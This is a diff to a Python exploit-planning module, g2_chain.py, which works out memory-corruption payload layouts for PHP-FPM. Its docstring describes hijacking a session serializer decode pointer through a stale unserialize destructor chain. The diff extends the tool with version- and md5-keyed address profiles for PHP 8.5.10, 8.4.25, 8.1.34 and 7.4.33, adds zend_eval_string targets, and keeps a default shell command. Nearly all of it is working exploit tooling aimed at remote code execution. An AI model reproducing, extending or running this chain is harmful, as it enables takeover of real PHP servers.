@@ -1,14 +1,16 @@
 #!/usr/bin/env python3
 """g2_chain.py - G2 FPM chain profile and offline php_binary record plan.
 
-G2 is the confirmed FPM route on the plain PHP 8.5.10 build: a controlled
-bailout leaves a stale BG(unserialize) dtor chain, the pre RINIT upload progress
-session decode reuses it, and the typed zval write reaches ps_serializers[2]
-decode in .data. The forced END decode then calls the overwritten pointer with
-the session record bytes as rdi.
+G2 is the confirmed FPM route on the plain PHP 8.5.10 build, with derived
+profiles for 8.4.25, 8.1.34 and 7.4.33: a controlled bailout leaves a stale
+BG(unserialize) dtor chain, the pre RINIT upload progress session decode reuses
+it, and the typed zval write reaches ps_serializers[2] decode in .data. The
+forced END decode then calls the overwritten pointer with the session record
+bytes as rdi. The default php handler decode slot is not 16 byte aligned, so its
+profile target is the PS(serializer) slot plus a fake ps_serializer struct.
 
 This module is profile data plus arithmetic: it loads
-addresses/g2_fpm_8510.json, computes
+addresses/g2_fpm_<build>.json selected by version, binary md5 or path, computes
 
     used_slots = (target - (b0 + 0x10)) / 16
 
@@ -27,6 +29,21 @@ from pathlib import Path
 
 HERE = Path(__file__).resolve()
 DEFAULT_PROFILE = HERE.parents[2] / "addresses" / "g2_fpm_8510.json"
+PROFILE_DIR = DEFAULT_PROFILE.parent
+# Version labels are convenience keys. The offsets are locked to the binary
+# md5, so a md5 key selects the same profile and a version key is only a label.
+PROFILE_FILES = {
+    "8.5.10": "g2_fpm_8510.json",
+    "8.4.25": "g2_fpm_8425.json",
+    "8.1.34": "g2_fpm_8134.json",
+    "7.4.33": "g2_fpm_7433.json",
+}
+PROFILE_MD5 = {
+    "825470df6b9fa7d0178a1a9bcf4ce6dc": "8.5.10",
+    "95cca39b95cb5f2d5b897fc5cc6e8628": "8.4.25",
+    "6ea2762ef76f44674805736e19570bb1": "8.1.34",
+    "9c7b5c2287fdebe6b3324223034715da": "7.4.33",
+}
 COMMAND_BYTES = 32
 FAKE_P_BYTES = 72
 FAKE_B0_BYTES = 16
@@ -46,8 +63,28 @@ def hex_int(value, name: str) -> int:
     raise ValueError(f"{name} is not an integer: {value!r}")
 
 
-def load_profile(path: Path | None = None) -> tuple[dict, Path]:
-    profile_path = Path(path) if path is not None else DEFAULT_PROFILE
+def resolve_profile(value: str | Path | None = None) -> Path:
+    """Map a profile version, md5 or .json path to a profile file."""
+    if value is None:
+        return DEFAULT_PROFILE
+    if isinstance(value, Path):
+        return value
+    key = str(value)
+    if key in PROFILE_FILES:
+        return PROFILE_DIR / PROFILE_FILES[key]
+    if key.lower() in PROFILE_MD5:
+        return PROFILE_DIR / PROFILE_FILES[PROFILE_MD5[key.lower()]]
+    path = Path(key)
+    if path.suffix.lower() == ".json":
+        return path
+    raise ValueError(
+        f"unknown g2 profile {key!r}; use one of "
+        + ", ".join(PROFILE_FILES) + ", a profile md5, or a .json path"
+    )
+
+
+def load_profile(value: str | Path | None = None) -> tuple[dict, Path]:
+    profile_path = resolve_profile(value)
     return json.loads(profile_path.read_text()), profile_path
 
 
@@ -130,14 +167,17 @@ def _long_value(value: str | bytes) -> bytes:
 def plan(x: int, p: int, b0: int, total: int | None = None,
          command: str | bytes = "id;exit;#", value: str | bytes | None = None,
          libc_base: int | None = None, target: int | None = None,
-         profile: dict | None = None) -> dict:
+         profile: dict | None = None,
+         profile_path: Path | None = None) -> dict:
     """Offline G2 record plan from operator supplied addresses.
 
     All addresses are explicit. The module never guesses X, P, B0 or a libc
     base; a missing or inconsistent address raises ValueError.
     """
     if profile is None:
-        profile, _path = load_profile()
+        profile, resolved_path = load_profile()
+        if profile_path is None:
+            profile_path = resolved_path
     table = profile["ps_serializers"]
     if target is None:
         target = hex_int(table["default_target"], "default target")
@@ -240,14 +280,18 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
 
     return {
         "profile": profile["name"],
+        "profile_source": str(profile_path) if profile_path is not None else None,
         "lane": profile["lane"],
         "stage": profile["stage"],
         "status": profile["status"],
         "binary": profile["binary"],
         "build_id": profile["build_id"],
+        "md5": profile.get("md5"),
         "php_version": profile["php_version"],
         "elf_type": profile["elf_type"],
         "pie": profile["pie"],
+        "zend_eval_string": profile.get("zend_eval_string"),
+        "zend_eval_stringl": profile.get("zend_eval_stringl"),
         "dry_run": True,
         "sent": False,
         "no_transport": True,
@@ -268,7 +312,13 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
             "table": table["table"],
             "active_serializer_slot": table["active_serializer_slot"],
             "terminator": table["terminator"],
+            "default_handler": table.get("default_handler"),
+            "default_php_decode": table.get("default_php_decode"),
+            "default_php_decode_16b_aligned": table.get(
+                "default_php_decode_16b_aligned"),
+            "note": table.get("note"),
         },
+        "ps_serializer_slot": profile.get("ps_serializer_slot"),
         "decode_call": profile["decode_call"],
         "used_slots": used_slots,
         "slot": f"0x{target:x}",
@@ -301,6 +351,8 @@ def main() -> int:
     parser.add_argument("--g2-x", required=True, help="record buffer zend_string X")
     parser.add_argument("--g2-p", required=True, help="stale php_unserialize_data P")
     parser.add_argument("--g2-b0", required=True, help="stale var_dtor_entries B0")
+    parser.add_argument("--g2-profile", default=None,
+                        help="profile version, md5 or .json path (default 8.5.10)")
     parser.add_argument("--g2-total", type=int, default=None)
     parser.add_argument("--g2-target", default=None)
     parser.add_argument("--g2-value", default=None)
@@ -309,6 +361,7 @@ def main() -> int:
     parser.add_argument("--output", type=Path, default=None)
     args = parser.parse_args()
     try:
+        profile, profile_path = load_profile(args.g2_profile)
         summary = plan(
             x=hex_int(args.g2_x, "--g2-x"),
             p=hex_int(args.g2_p, "--g2-p"),
@@ -320,6 +373,8 @@ def main() -> int:
                        if args.libc_base is not None else None),
             target=(hex_int(args.g2_target, "--g2-target")
                     if args.g2_target is not None else None),
+            profile=profile,
+            profile_path=profile_path,
         )
     except (OSError, TypeError, ValueError) as error:
         print(json.dumps({"step": "g2", "error": f"{type(error).__name__}: {error}"}))
